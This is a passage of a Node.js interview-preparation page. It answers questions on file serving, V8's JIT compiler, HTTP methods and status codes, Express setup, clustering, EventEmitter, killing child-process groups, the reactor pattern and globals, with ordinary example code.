 &lt;li&gt;Delete files&lt;/li&gt; 
 &lt;li&gt;Rename files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Read Files&lt;/strong&gt;&lt;br&gt; index.html&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;h1&amp;gt;My Header&amp;lt;/h1&amp;gt;
  &amp;lt;p&amp;gt;My paragraph.&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// read_file.js

var http = require(&#39;http&#39;);
var fs = require(&#39;fs&#39;);
http.createServer(function (req, res) {
  fs.readFile(&#39;index.html&#39;, function(err, data) {
    res.writeHead(200, {&#39;Content-Type&#39;: &#39;text/html&#39;});
    res.write(data);
    res.end();
  });
}).listen(8080);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Initiate read_file.js:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;node read_file.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is JIT and how is it related to Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js has depended on the V8 JavaScript engine to provide code execution in the language. The V8 is a JavaScript engine built at the google development center, in Germany. It is open source and written in C++. It is used for both client side (Google Chrome) and server side (node.js) JavaScript applications. A central piece of the V8 engine that allows it to execute JavaScript at high speed is the JIT (Just In Time) compiler. This is a dynamic compiler that can optimize code during runtime. When V8 was first built the JIT Compiler was dubbed FullCodegen. Then, the V8 team implemented Crankshaft, which included many performance optimizations that FullCodegen did not implement.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;V8&lt;/code&gt; was first designed to increase the performance of the JavaScript execution inside web browsers. In order to obtain speed, V8 translates JavaScript code into more efficient machine code instead of using an interpreter. It compiles JavaScript code into machine code at execution by implementing a JIT (Just-In-Time) compiler like a lot of modern JavaScript engines such as SpiderMonkey or Rhino (Mozilla) are doing. The main difference with V8 is that it doesn‚Äôt produce bytecode or any intermediate code.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is difference between put and patch?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;PUT and PATCH are HTTP verbs and they both relate to updating a resource. The main difference between PUT and PATCH requests are in the way the server processes the enclosed entity to modify the resource identified by the Request-URI.&lt;/p&gt; 
&lt;p&gt;In a PUT request, the enclosed entity is considered to be a modified version of the resource stored on the origin server, and the client is requesting that the stored version be replaced.&lt;/p&gt; 
&lt;p&gt;With PATCH, however, the enclosed entity contains a set of instructions describing how a resource currently residing on the origin server should be modified to produce a new version.&lt;/p&gt; 
&lt;p&gt;Also, another difference is that when you want to update a resource with PUT request, you have to send the full payload as the request whereas with PATCH, you only send the parameters which you want to update.&lt;/p&gt; 
&lt;p&gt;The most commonly used HTTP verbs POST, GET, PUT, DELETE are similar to CRUD (Create, Read, Update and Delete) operations in database. We specify these HTTP verbs in the capital case. So, the below is the comparison between them.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;POST&lt;/code&gt; - create&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;GET&lt;/code&gt; - read&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;PUT&lt;/code&gt; - update&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;DELETE&lt;/code&gt; - delete&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;PATCH&lt;/strong&gt;: Submits a partial modification to a resource. If you only need to update one field for the resource, you may want to use the PATCH method.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;List types of Http requests supported by Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The HTTP core module is a key module to Node.js networking.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const http = require(&#39;http&#39;)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;http.METHODS&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;require(&#39;http&#39;).METHODS
[ &#39;ACL&#39;,
  &#39;BIND&#39;,
  &#39;CHECKOUT&#39;,
  &#39;CONNECT&#39;,
  &#39;COPY&#39;,
  &#39;DELETE&#39;,
  &#39;GET&#39;,
  &#39;HEAD&#39;,
  &#39;LINK&#39;,
  &#39;LOCK&#39;,
  &#39;M-SEARCH&#39;,
  &#39;MERGE&#39;,
  &#39;MKACTIVITY&#39;,
  &#39;MKCALENDAR&#39;,
  &#39;MKCOL&#39;,
  &#39;MOVE&#39;,
  &#39;NOTIFY&#39;,
  &#39;OPTIONS&#39;,
  &#39;PATCH&#39;,
  &#39;POST&#39;,
  &#39;PROPFIND&#39;,
  &#39;PROPPATCH&#39;,
  &#39;PURGE&#39;,
  &#39;PUT&#39;,
  &#39;REBIND&#39;,
  &#39;REPORT&#39;,
  &#39;SEARCH&#39;,
  &#39;SUBSCRIBE&#39;,
  &#39;TRACE&#39;,
  &#39;UNBIND&#39;,
  &#39;UNLINK&#39;,
  &#39;UNLOCK&#39;,
  &#39;UNSUBSCRIBE&#39; ]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;http.STATUS_CODES&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;require(&#39;http&#39;).STATUS_CODES
{ &#39;100&#39;: &#39;Continue&#39;,
&#39;101&#39;: &#39;Switching Protocols&#39;,
&#39;102&#39;: &#39;Processing&#39;,
&#39;200&#39;: &#39;OK&#39;,
&#39;201&#39;: &#39;Created&#39;,
&#39;202&#39;: &#39;Accepted&#39;,
&#39;203&#39;: &#39;Non-Authoritative Information&#39;,
&#39;204&#39;: &#39;No Content&#39;,
&#39;205&#39;: &#39;Reset Content&#39;,
&#39;206&#39;: &#39;Partial Content&#39;,
&#39;207&#39;: &#39;Multi-Status&#39;,
&#39;208&#39;: &#39;Already Reported&#39;,
&#39;226&#39;: &#39;IM Used&#39;,
&#39;300&#39;: &#39;Multiple Choices&#39;,
&#39;301&#39;: &#39;Moved Permanently&#39;,
&#39;302&#39;: &#39;Found&#39;,
&#39;303&#39;: &#39;See Other&#39;,
&#39;304&#39;: &#39;Not Modified&#39;,
&#39;305&#39;: &#39;Use Proxy&#39;,
&#39;307&#39;: &#39;Temporary Redirect&#39;,
&#39;308&#39;: &#39;Permanent Redirect&#39;,
&#39;400&#39;: &#39;Bad Request&#39;,
&#39;401&#39;: &#39;Unauthorized&#39;,
&#39;402&#39;: &#39;Payment Required&#39;,
&#39;403&#39;: &#39;Forbidden&#39;,
&#39;404&#39;: &#39;Not Found&#39;,
&#39;405&#39;: &#39;Method Not Allowed&#39;,
&#39;406&#39;: &#39;Not Acceptable&#39;,
&#39;407&#39;: &#39;Proxy Authentication Required&#39;,
&#39;408&#39;: &#39;Request Timeout&#39;,
&#39;409&#39;: &#39;Conflict&#39;,
&#39;410&#39;: &#39;Gone&#39;,
&#39;411&#39;: &#39;Length Required&#39;,
&#39;412&#39;: &#39;Precondition Failed&#39;,
&#39;413&#39;: &#39;Payload Too Large&#39;,
&#39;414&#39;: &#39;URI Too Long&#39;,
&#39;415&#39;: &#39;Unsupported Media Type&#39;,
&#39;416&#39;: &#39;Range Not Satisfiable&#39;,
&#39;417&#39;: &#39;Expectation Failed&#39;,
&#39;418&#39;: &#39;I\&#39;m a teapot&#39;,
&#39;421&#39;: &#39;Misdirected Request&#39;,
&#39;422&#39;: &#39;Unprocessable Entity&#39;,
&#39;423&#39;: &#39;Locked&#39;,
&#39;424&#39;: &#39;Failed Dependency&#39;,
&#39;425&#39;: &#39;Unordered Collection&#39;,
&#39;426&#39;: &#39;Upgrade Required&#39;,
&#39;428&#39;: &#39;Precondition Required&#39;,
&#39;429&#39;: &#39;Too Many Requests&#39;,
&#39;431&#39;: &#39;Request Header Fields Too Large&#39;,
&#39;451&#39;: &#39;Unavailable For Legal Reasons&#39;,
&#39;500&#39;: &#39;Internal Server Error&#39;,
&#39;501&#39;: &#39;Not Implemented&#39;,
&#39;502&#39;: &#39;Bad Gateway&#39;,
&#39;503&#39;: &#39;Service Unavailable&#39;,
&#39;504&#39;: &#39;Gateway Timeout&#39;,
&#39;505&#39;: &#39;HTTP Version Not Supported&#39;,
&#39;506&#39;: &#39;Variant Also Negotiates&#39;,
&#39;507&#39;: &#39;Insufficient Storage&#39;,
&#39;508&#39;: &#39;Loop Detected&#39;,
&#39;509&#39;: &#39;Bandwidth Limit Exceeded&#39;,
&#39;510&#39;: &#39;Not Extended&#39;,
&#39;511&#39;: &#39;Network Authentication Required&#39; }
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Making HTTP Requests&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const request = require(&#39;request&#39;);

request(&#39;https://nodejs.org/&#39;, function(err, res, body) {
    console.log(body);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The first argument to request can either be a URL string, or an object of options. Here are some of the more common options you&#39;ll encounter in your applications:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;url&lt;/strong&gt;: The destination URL of the HTTP request&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;method&lt;/strong&gt;: The HTTP method to be used (GET, POST, DELETE, etc)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;headers&lt;/strong&gt;: An object of HTTP headers (key-value) to be set in the request&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;form&lt;/strong&gt;: An object containing key-value form data&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const request = require(&#39;request&#39;);

const options = {
    url: &#39;https://nodejs.org/file.json&#39;,
    method: &#39;GET&#39;,
    headers: {
        &#39;Accept&#39;: &#39;application/json&#39;,
        &#39;Accept-Charset&#39;: &#39;utf-8&#39;,
        &#39;User-Agent&#39;: &#39;my-reddit-client&#39;
    }
};

request(options, function(err, res, body) {
    let json = JSON.parse(body);
    console.log(json);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Using the options object, this request uses the GET method to retrieve JSON data directly from Reddit, which is returned as a string in the body field. From here, you can use &lt;code&gt;JSON.parse&lt;/code&gt; and use the data as a normal JavaScript object.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Why to use Express.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;ExpressJS is a prebuilt NodeJS framework that can help you in creating server-side web applications faster and smarter. Simplicity, minimalism, flexibility, scalability are some of its characteristics and since it is made in NodeJS itself, it inherited its performance as well.&lt;/p&gt; 
&lt;p&gt;Express 3.x is a light-weight web application framework to help organize your web application into an MVC architecture on the server side. You can then use a database like &lt;code&gt;MongoDB&lt;/code&gt; with &lt;code&gt;Mongoose&lt;/code&gt; (for modeling) to provide a backend for your Node.js application. Express.js basically helps you manage everything, from routes, to handling requests and views.&lt;/p&gt; 
&lt;p&gt;It has become the standard server framework for node.js. Express is the backend part of something known as the MEAN stack. The MEAN is a free and open-source JavaScript software stack for building dynamic web sites and web applications which has the following components;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;MongoDB&lt;/strong&gt; - The standard NoSQL database&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Express.js&lt;/strong&gt; - The default web applications framework&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Angular.js&lt;/strong&gt; - The JavaScript MVC framework used for web applications&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt; - Framework used for scalable server-side and networking applications.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;The Express.js framework makes it very easy to develop an application which can be used to handle multiple types of requests like the GET, PUT, and POST and DELETE requests.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;using Express&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var express=require(&#39;express&#39;);
var app=express();
app.get(&#39;/&#39;,function(req,res) {
  res.send(&#39;Hello World!&#39;);
});
var server=app.listen(3000,function() {});
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Write the steps for setting up an Express JS application?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;1. Install Express Generator&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;C:\node&amp;gt;npm install -g express-generator
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;2. Create an Express Project&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;C:\node&amp;gt;express --view=&quot;ejs&quot; nodetest1
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;3. Edit Dependencies&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;MAKE SURE TO CD INTO YOUR nodetest FOLDER. OK, now we have some basic structure in there, but we&#39;re not quite done. You&#39;ll note that the express-generator routine created a file called package.json in your nodetest1 directory. Open this up in a text editor and it&#39;ll look like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// C:\node\nodetest1\package.json
{
  &quot;name&quot;: &quot;nodetest1&quot;,
  &quot;version&quot;: &quot;0.0.0&quot;,
  &quot;private&quot;: true,
  &quot;scripts&quot;: {
    &quot;start&quot;: &quot;node ./bin/www&quot;
  },
  &quot;dependencies&quot;: {
    &quot;cookie-parser&quot;: &quot;~1.4.3&quot;,
    &quot;debug&quot;: &quot;~2.6.9&quot;,
    &quot;ejs&quot;: &quot;~2.5.7&quot;,
    &quot;express&quot;: &quot;~4.16.0&quot;,
    &quot;http-errors&quot;: &quot;~1.6.2&quot;,
    &quot;morgan&quot;: &quot;~1.9.0&quot;
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This is a basic JSON file describing our app and its dependencies. We need to add a few things to it. Specifically, calls for MongoDB and Monk.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;C:\node\nodetest1&amp;gt;npm install --save monk@^6.0.6 mongodb@^3.1.13
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;4. Install Dependencies&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;C:\node\nodetest1&amp;gt;npm install
C:\node\nodetest1&amp;gt;npm start
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Node Console&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; nodetest1@0.0.0 start C:\node\nodetest1
&amp;gt; node ./bin/www
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Since node is a single threaded process, how to make use of all CPUs?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js is a single threaded language which in background uses multiple threads to execute asynchronous code. Node.js is non-blocking which means that all functions ( callbacks ) are delegated to the event loop and they are ( or can be ) executed by different threads. That is handled by Node.js run-time.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Node.js does support forking multiple processes ( which are executed on different cores ).&lt;/li&gt; 
 &lt;li&gt;It is important to know that state is not shared between master and forked process.&lt;/li&gt; 
 &lt;li&gt;We can pass messages to forked process ( which is different script ) and to master process from forked process with function send.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;A single instance of Node.js runs in a single thread. To take advantage of multi-core systems, the user will sometimes want to launch a cluster of Node.js processes to handle the load. The cluster module allows easy creation of child processes that all share server ports.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const cluster = require(&#39;cluster&#39;);
const http = require(&#39;http&#39;);
const numCPUs = require(&#39;os&#39;).cpus().length;

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers.
  for (let i = 0; i &amp;lt; numCPUs; i++) {
    cluster.fork();
  }

  cluster.on(&#39;exit&#39;, (worker, code, signal) =&amp;gt; {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {
  // Workers can share any TCP connection
  // In this case it is an HTTP server
  http.createServer((req, res) =&amp;gt; {
    res.writeHead(200);
    res.end(&#39;hello world\n&#39;);
  }).listen(8000);

  console.log(`Worker ${process.pid} started`);
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Running Node.js will now share port 8000 between the workers:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ node server.js
Master 3596 is running
Worker 4324 started
Worker 4520 started
Worker 6056 started
Worker 5644 started
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The worker processes are spawned using the &lt;code&gt;child_process.fork()&lt;/code&gt; method, so that they can communicate with the parent via IPC and pass server handles back and forth.&lt;/p&gt; 
&lt;p&gt;The cluster module supports two methods of distributing incoming connections.&lt;/p&gt; 
&lt;p&gt;The first one (and the default one on all platforms except Windows), is the round-robin approach, where the master process listens on a port, accepts new connections and distributes them across the workers in a round-robin fashion, with some built-in smarts to avoid overloading a worker process.&lt;/p&gt; 
&lt;p&gt;The second approach is where the master process creates the listen socket and sends it to interested workers. The workers then accept incoming connections directly.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What does emitter do and what is dispatcher?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js core API is based on asynchronous event-driven architecture in which certain kind of objects called emitters periodically emit events that cause listener objects to be called.&lt;/p&gt; 
&lt;p&gt;All objects that emit events are members of EventEmitter class. These objects expose an eventEmitter.on() function that allows one or more functions to be attached to named events emitted by the object.&lt;/p&gt; 
&lt;p&gt;When the EventEmitter object emits an event, all of the functions attached to that specific event are called synchronously. All values returned by the called listeners are ignored and will be discarded.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const EventEmitter = require(&#39;events&#39;);
class MyEmitter extends EventEmitter {}
const myEmitter = new MyEmitter();
myEmitter.on(&#39;event&#39;, function(a, b) {
  console.log(a, b, this);
  // Prints:
  //   Technoetics Club MyEmitter {
  //     domain: null,
  //     _events: { event: [Function] },
  //     _eventsCount: 1,
  //     _maxListeners: undefined }
});
myEmitter.emit(&#39;event&#39;,&#39;Technoetics&#39;, &#39;Club&#39;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Here we create a myEmitter object and emit event at the end which triggers the callback function and we are able to get the desired output.&lt;/p&gt; 
&lt;p&gt;By default, all listeners attached to a particular event object are called by the EventListener object synchronously in the order in which they are registered or attached to the event object.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Dispatcher&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The Dispatcher has functionality not provided nor expected in EventEmitter, the most notable being waitFor, which allows a store to ensure that another store has been updated in response to an action before it proceeds.&lt;/p&gt; 
&lt;p&gt;Pattern-wise, the Dispatcher is also a singleton, whereas EventEmitter is an API that you might object-assign onto multiple stores.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to kill child processes that spawn their own child processes in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;If a child process in Node.js spawn their own child processes, kill() method will not kill the child process‚Äôs own child processes. For example, if I start a process that starts it‚Äôs own child processes via child_process module, killing that child process will not make my program to quit.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var spawn = require(&#39;child_process&#39;).spawn;
var child = spawn(&#39;my-command&#39;);

child.kill();
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The program above will not quit if &lt;code&gt;my-command&lt;/code&gt; spins up some more processes.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;PID range hack&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;We can start child processes with {detached: true} option so those processes will not be attached to main process but they will go to a new group of processes. Then using process.kill(-pid) method on main process we can kill all processes that are in the same group of a child process with the same pid group. In my case, I only have one processes in this group.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var spawn = require(&#39;child_process&#39;).spawn;
var child = spawn(&#39;my-command&#39;, {detached: true});

process.kill(-child.pid);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please note - before pid. This converts a pid to a group of pids for process kill() method.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What do you understand by Reactor Pattern in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Reactor Pattern is an idea of non-blocking I/O operations in Node.js. This pattern provides a handler(in case of Node.js, a callback function) that is associated with each I/O operation. When an I/O request is generated, it is submitted to a demultiplexer.&lt;/p&gt; 
&lt;p&gt;This demultiplexer is a notification interface that is used to handle concurrency in non-blocking I/O mode and collects every request in form of an event and queues each event in a queue. Thus, the demultiplexer provides the Event Queue, which we often hear. When a request is collected by the demultiplexer, it returns the control back to the system and does not blocks the I/O. At the same time, there is an Event Loop which iterates over the items in the Event Queue. Every event has a callback function associated with it, and that callback function is invoked when the Event Loop iterates.&lt;/p&gt; 
&lt;p&gt;The callback function further mostly have other callbacks associated within representing some asynchronous operations. These operations are inserted in the Event Queue by the demultiplexer and are ready to be processed once the Event Loop iterates over them. That is why calls to other operations must be asynchronous.&lt;/p&gt; 
&lt;p&gt;When all the items in the Event Queue are processed and there are no pending operations left, Node.js terminates the application automatically.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;ol&gt; 
 &lt;li&gt;The application generates a new I/O operation by submitting a request to the Event Demultiplexer. The application also specifies a handler, which will be invoked when the operation completes. Submitting a new request to the Event Demultiplexer is a non-blocking call and it immediately returns the control back to the application.&lt;/li&gt; 
 &lt;li&gt;When a set of I/O operations completes, the Event Demultiplexer pushes the new events into the Event Queue.&lt;/li&gt; 
 &lt;li&gt;At this point, the Event Loop iterates over the items of the Event Queue.&lt;/li&gt; 
 &lt;li&gt;For each event, the associated handler is invoked.&lt;/li&gt; 
 &lt;li&gt;The handler, which is part of the application code, will give back the control to the Event Loop when its execution completes (5a). However, new asynchronous operations might be requested during the execution of the handler (5b), causing new operations to be inserted in the Event Demultiplexer (1), before the control is given back to the Event Loop.&lt;/li&gt; 
 &lt;li&gt;When all the items in the Event Queue are processed, the loop will block again on the Event Demultiplexer which will then trigger another cycle.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the key features of Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Asynchronous event driven IO helps concurrent request handling&lt;/strong&gt; ‚Äì All APIs of Node.js are asynchronous. This feature means that if a Node receives a request for some Input/Output operation, it will execute that operation in the background and continue with the processing of other requests. Thus it will not wait for the response from the previous requests.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fast in Code execution&lt;/strong&gt; ‚Äì Node.js uses the V8 JavaScript Runtime engine, the one which is used by Google Chrome. Node has a wrapper over the JavaScript engine which makes the runtime engine much faster and hence processing of requests within Node.js also become faster.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Single Threaded but Highly Scalable&lt;/strong&gt; ‚Äì Node.js uses a single thread model for event looping. The response from these events may or may not reach the server immediately. However, this does not block other operations. Thus making Node.js highly scalable. Traditional servers create limited threads to handle requests while Node.js creates a single thread that provides service to much larger numbers of such requests.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Node.js library uses JavaScript&lt;/strong&gt; ‚Äì This is another important aspect of Node.js from the developer‚Äôs point of view. The majority of developers are already well-versed in JavaScript. Hence, development in Node.js becomes easier for a developer who knows JavaScript.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;There is an Active and vibrant community for the Node.js framework&lt;/strong&gt; ‚Äì The active community always keeps the framework updated with the latest trends in the web development.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Buffering&lt;/strong&gt; ‚Äì Node.js applications never buffer any data. They simply output the data in chunks.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are globals in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;There are three keywords in Node.js which constitute as Globals. These are Global, Process, and Buffer.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;1. Global&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The Global keyword represents the global namespace object. It acts as a container for all other &lt;code&gt;global&lt;/code&gt; objects. If we type &lt;code&gt;console.log(global)&lt;/code&gt;, it will print out all of them.&lt;/p&gt; 
&lt;p&gt;An important point to note about the global objects is that not all of them are in the global scope, some of them fall in the module scope. So, it is wise to declare them without using the var keyword or add them to Global object.&lt;/p&gt; 
&lt;p&gt;Variables declared using the var keyword become local to the module whereas those declared without it get subscribed to the global object.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;2. Process&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;It is also one of the global objects but includes additional functionality to turn a synchronous function into an async callback. There is no boundation to access it from anywhere in the code. It is the instance of the EventEmitter class. And each node application object is an instance of the Process object.&lt;/p&gt; 
&lt;p&gt;It primarily gives back the information about the application or the environment.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;process.execPath&amp;gt;&lt;/code&gt; ‚Äì to get the execution path of the Node app.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;process.Version&amp;gt;&lt;/code&gt; ‚Äì to get the Node version currently running.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;process.platform&amp;gt;&lt;/code&gt; ‚Äì to get the server platform.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Some of the other useful Process methods are as follows.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;process.memoryUsage&amp;gt;&lt;/code&gt; ‚Äì To know the memory used by Node application.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;process.NextTick&amp;gt;&lt;/code&gt; ‚Äì To attach a callback function that will get called during the next loop. It can cause a delay in executing a function.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;3. Buffer&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The Buffer is a class in Node.js to handle binary data. It is similar to a list of integers but stores as a raw memory outside the V8 heap.&lt;/p&gt; 
&lt;p&gt;We can convert JavaScript string objects into Buffers. But it requires mentioning the encoding type explicitly.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;ascii&amp;gt;&lt;/code&gt; ‚Äì Specifies 7-bit ASCII data.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;utf8&amp;gt;&lt;/code&gt; ‚Äì Represents multibyte encoded Unicode char set.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;utf16le&amp;gt;&lt;/code&gt; ‚Äì Indicates 2 or 4 bytes, little endian encoded Unicode chars.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;base64&amp;gt;&lt;/code&gt; ‚Äì Used for Base64 string encoding.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;hex&amp;gt;&lt;/code&gt; ‚Äì Encodes each byte as two hexadecimal chars.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Here is the syntax to use the Buffer class.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var buffer = new Buffer(string, [encoding]);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The above command will allocate a new buffer holding the string with &lt;code&gt;utf8&lt;/code&gt; as the default encoding. However, if you like to write a &lt;code&gt;string&lt;/code&gt; to an existing buffer object, then use the following line of code.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;buffer.write(string)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This class also offers other methods like &lt;code&gt;readInt8&lt;/code&gt; and &lt;code&gt;writeUInt8&lt;/code&gt; that allows read/write from various types of data to the buffer.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is chaining process in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
